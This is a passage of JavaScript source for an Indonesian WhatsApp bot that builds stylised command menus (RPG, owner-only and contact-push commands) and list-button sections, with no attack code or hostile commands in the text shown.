            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: "anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: "randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: "randomphotomenubutton",
           },
        ]},
      {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break;
case 'rpgmenubutton': {
let teks =`┏『 *\`乂 ʀ ᴘ ɢ - ᴍ ᴇ ɴ ᴜ 乂\`* 』━◧
║◦ *${prefix}kerja*
║◦ *${prefix}fightnaga*
║◦ *${prefix}fightkucing*
║◦ *${prefix}fightphonix*
║◦ *${prefix}fightgriffin*
║◦ *${prefix}fightkyubi*
║◦ *${prefix}fightcentaur*
║◦ *${prefix}nabung*
║◦ *${prefix}mining*
║◦ *${prefix}bankcek*
║◦ *${prefix}maling*
║◦ *${prefix}banknabung*
║◦ *${prefix}banktarik*
║◦ *${prefix}berkebon*
║◦ *${prefix}crafting*
║◦ *${prefix}bet*
║◦ *${prefix}bonus*
║◦ *${prefix}buah*
║◦ *${prefix}nebang*
║◦ *${prefix}bekerja*
║◦ *${prefix}bansos*
║◦ *${prefix}taxy*
║◦ *${prefix}mulung*
║◦ *${prefix}berburu*
║◦ *${prefix}polisi*
║◦ *${prefix}berdagang*
║◦ *${prefix}rampok*
║◦ *${prefix}bunuh*
║◦ *${prefix}collect*
║◦ *${prefix}mancing*
║◦ *${prefix}repair*
║◦ *${prefix}feed*
║◦ *${prefix}fight*
║◦ *${prefix}gajian*
║◦ *${prefix}upgrade*
║◦ *${prefix}transfer*
║◦ *${prefix}shop*
║◦ *${prefix}selectskill*
║◦ *${prefix}sampah*
║◦ *${prefix}roket*
║◦ *${prefix}ojek*
║◦ *${prefix}nguli*
║◦ *${prefix}pasar*
║◦ *${prefix}rob*
║◦ *${prefix}referal*
║◦ *${prefix}petshop*
║◦ *${prefix}kolam*
║◦ *${prefix}koboy*
║◦ *${prefix}leaderboard*
║◦ *${prefix}casino*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `caibutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: "anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: "randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: "randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}
break
case 'ownermenubutton': {
let teks =`┏『 *\`乂 ᴏ ᴡ ɴ ᴇ ʀ - ᴏ ɴ ʟ ʏ 乂\`* 』━⊱
║◦ *${prefix}autoread*
║◦ *${prefix}upchv2*
║◦ *${prefix}addsewa*
║◦ *${prefix}delsewa*
║◦ *${prefix}onlypc*
║◦ *${prefix}onlygc*
║◦ *${prefix}self*
║◦ *${prefix}clearchat*
║◦ *${prefix}pinchat*
║◦ *${prefix}unpinchat*
║◦ *${prefix}gconly* 
║◦ *${prefix}public* 
║◦ *${prefix}setpppanjang* 
║◦ *${prefix}setppgcpanjang* 
║◦ *${prefix}addcase*
║◦ *${prefix}join* 
║◦ *${prefix}bctext* 
║◦ *${prefix}poll* 
║◦ *${prefix}bcimage*
║◦ *${prefix}bcvideo*
║◦ *${prefix}creategc*
║◦ *${prefix}setexif*
║◦ *${prefix}userjid*
║◦ *${prefix}setbotname*
║◦ *${prefix}setbotbio*
║◦ *${prefix}delppbot*
║◦ *${prefix}restart*
║◦ *${prefix}setppbot*
║◦ *${prefix}addprem*
║◦ *${prefix}delprem*
║◦ *${prefix}addowner*
║◦ *${prefix}delowner*
║◦ *${prefix}addvn*
║◦ *${prefix}delvn*
║◦ *${prefix}addsticker*
║◦ *${prefix}delsticker*
║◦ *${prefix}addimage*
║◦ *${prefix}delimage*
║◦ *${prefix}addvideo*
║◦ *${prefix}delvideo*
║◦ *${prefix}block*
║◦ *${prefix}unblock del*
║◦ *${prefix}leavegc*
║◦ *${prefix}pushkontak*
║◦ *${prefix}pushkontakv2*
║◦ *${prefix}pushkontakv3*
║◦ *${prefix}pushkontakv4*
║◦ *${prefix}savekontakv*
║◦ *${prefix}savekontakv2*
║◦ *${prefix}getkontak*
║◦ *${prefix}sendkontak*
║◦ *${prefix}jpm*
║◦ *${prefix}jpm2*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
            id: `.stickermenubutton`, 
          },
          {
            title: "sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.stalkermenubutton`, 
          },
          {
            title: "ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʜᴏᴛᴏ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
            id: `.primbonmenubutton`, 
          },
          {
            title: "sᴇʀᴛɪғɪᴋᴀᴛ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
            id: `.sertifikatmenubutton`, 
          },
          {
            title: "ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            id: `.downloadmenubutton`, 
          },
          {
            title: "ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴛᴀʟᴋᴇʀ ᴍᴇɴᴜ",
            id: `.ephoto360menubutton`, 
          },
          { 
           title: "ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴᴏɴʏᴍᴏᴜs ᴍᴇɴᴜ",
           id: ".anonymousmenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           description: ".ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ ᴍᴇɴᴜ",
           id: ".randomvideomenubutton",
           },
            { 
           title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ ᴍᴇɴᴜ",
           id: ".randomphotomenubutton",
           },
        ]},
            {
        title: `ɪɴғᴏʀᴍᴀsɪ ʏᴏɪᴍɪʏᴀ ᴀssɪsᴛᴇɴᴛ`, 
        highlight_label: `ᴅɪɴᴢɪᴅ ᴏғғᴄ`,
        rows: [
          {
            title: "ɪɴғᴏ ʙᴏᴛ",
            description: "ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
            id: `.infobot`,
            },
            {
             title: "ᴍᴇɴᴜ sɪᴍᴘʟᴇ",
            description: "ᴋᴇᴍʙᴀʟɪ ᴋᴇ ᴍᴇɴᴜ sɪᴍᴘᴇʟ",
            id: `.menu`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break
case 'pushmenubutton': {
let teks =`┏『 *\`乂 ᴘ ᴜ s ʜ - ᴍᴇɴᴜ 乂\`* 』━━◧
┣» *${prefix}cekidgc*
┣» *${prefix}pushkontak*
┣» *${prefix}pushkontakv2*
┣» *${prefix}pushkontakv3*
┣» *${prefix}pushkontakv4*
┣» *${prefix}savekontakv*
┣» *${prefix}savekontakv2*
┣» *${prefix}getkontak*
┣» *${prefix}sendkontak*
┣» *${prefix}jpm*
┣» *${prefix}jpm2*
┗━━━━━━━━━━━━━━⊱`
const bet = {
    title: "LIST MENU",
    sections: [
      {
        title: `ʟɪsᴛ ʏᴀɴɢ sᴇʀɪɴɢ ᴅɪᴘᴀᴋᴀɪ`, 
        highlight_label: `.ᴘᴏᴘᴜʟᴇʀ`,
        rows: [
          {
            title: "ᴀʟʟ ᴍᴇɴᴜ ʏᴏɪᴍɪʏᴀ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.allmenubutton`, 
          },
        ]},
        {
        title: `ᴍᴇɴᴜ ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ᴄʜᴀʀᴀᴄᴛᴇʀ.ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ sᴇᴍᴜᴀ ᴍᴇɴᴜ",
            id: `.caibutton`, 
          },
        ]},
        {
        title: `ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ`, 
        highlight_label: `ᴘᴇᴍʙᴀʀᴜᴀɴ ғɪᴛᴜʀ`,
        rows: [
          {
            title: "ɴᴇᴡ ᴜᴘᴅᴀᴛᴇ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʙᴀʀᴜ",
            id: `.newupdatebutton`, 
          },
          {
            title: "ғɪᴛᴜʀ ғɪx",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ғɪᴛᴜʀ ʏᴀɴɢ sᴜᴅᴀʜ ᴅɪ ғɪx",
            id: `.fixbutton`, 
          },
        ]},
      {
        title: `ʟɪsᴛ ᴍᴇɴᴜ ʏᴀɴɢ ᴅɪᴘɪsᴀʜᴋᴀɴ`, 
        highlight_label: ``,
        rows: [
          {
            title: "ʙᴀᴄᴀ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘᴇʀᴀᴛᴜʀᴀɴ",
            id: `.bacaperaturanbutton`, 
          },
          {
            title: "ᴅᴏɴᴀsɪ",
            description: "ᴍeɴᴀᴍᴘɪʟᴋᴀɴ ᴍᴇɴᴜ ᴅᴏɴᴀsɪ",
            id: `.donasibutton`, 
          },
          {
            title: "ᴀɪ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            id: `.aimenubutton`, 
          },
          {
            title: "ғᴜɴ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            id: `.funmenubutton`, 
          },
          {
            title: "ʀᴘɢ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɢᴀᴍᴇs ᴍᴇɴᴜ",
            id: `.rpgmenubutton`, 
          },
          {
            title: "ᴘᴜsʜᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ",
            id: `.pushmenubutton`, 
          },
          {
            title: "ɴғsᴡ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴄᴘᴀɴᴇʟ ᴍᴇɴᴜ",
            id: `nfswmenubutton`, 
          },
          {
            title: "ɢᴀᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴘʀɪᴍʙᴏɴ ᴍᴇɴᴜ",
            id: `.gamemenubutton`, 
          },
          {
            title: "sᴛᴏʀᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴅᴏᴡɴʟᴏᴀᴅ ᴍᴇɴᴜ",
            id: `.storemenubutton`, 
          },
          {
            title: "ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɪ ᴍᴇɴᴜ",
            id: `.animebutton`, 
          },
          {
            title: "ᴏᴛʜᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴀɴɪᴍᴇ ᴍᴇɴᴜ",
            id: `.othermenubutton`, 
          },
          {
            title: "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴇᴘʜᴏᴛᴏ360 ᴍᴇɴᴜ",
            id: `.ownermenubutton`, 
          },
          {
            title: "ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ Fuɴ ᴍᴇɴᴍ",
            id: `.groupmenubutton`, 
          },
          {
            title: "ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ɪsʟᴀᴍɪᴄ ᴍᴇɴᴜ",
            id: `.islamimenubutton`, 
          },
          {
            title: "ʙᴇʀɪᴛᴀ ᴍᴇɴᴜ ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ᴏᴛʜᴇʀs ᴍᴇɴᴜ",
            id: `.beritamenubutton`, 
          },
          {
            title: "ǫᴜᴏᴛᴇs ᴍᴇɴᴜ",
            description: "ᴍᴇɴᴀᴍᴘɪʟᴋᴀɴ ʀᴘɢ ᴍᴇɴᴜ",
            id: `.quotesmenubutton`, 
          },
          {
            title: "sᴛɪᴄᴋᴇʀ ᴍᴇɴᴜ",
